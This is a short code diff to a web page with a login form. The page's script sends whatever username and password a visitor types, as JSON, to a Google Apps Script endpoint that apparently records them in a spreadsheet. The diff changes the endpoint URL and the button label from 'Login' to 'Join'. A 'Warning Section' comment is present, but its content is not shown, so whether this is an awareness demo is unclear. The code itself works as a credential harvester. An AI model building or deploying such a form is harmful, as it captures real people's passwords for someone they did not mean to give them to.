@@ -30,7 +30,7 @@
         <form onsubmit="sendDataToGoogleSheets(); return false;">
             <input type="text" id="username" placeholder="username" class="input-field">
             <input type="password" id="password" placeholder="Password" class="input-field">
-            <button type="submit" class="login-btn">Login</button>
+            <button type="submit" class="login-btn">Join</button>
         </form>
     </div>
     <!-- Warning Section -->
@@ -79,14 +79,16 @@ function sendDataToGoogleSheets() {
         password: document.getElementById("password").value
     };
 
-    fetch("https://script.google.com/macros/s/AKfycbzqCuhQpC9gkbJOdebDYb7drGKpN3Y0iBdXB-PLphAtvtljpsAZ2Q6HoQgDpz3AC8fFzg/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbxRgLZHsbZVbi4zi95wLgVNwmZ2XGqCXFYa3L8YJ5jeA04XkNm_qOupkzX7jDypCFr4ww/exec", {
         method: "POST",
-        mode: "no-cors",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
-    }).then(response => console.log("Data sent!"))
+    })
+    .then(response => response.text())  // Convert response to text
+    .then(data => console.log("Server Response:", data))
     .catch(error => console.error("Error:", error));
 }
+
 
 
     </script>
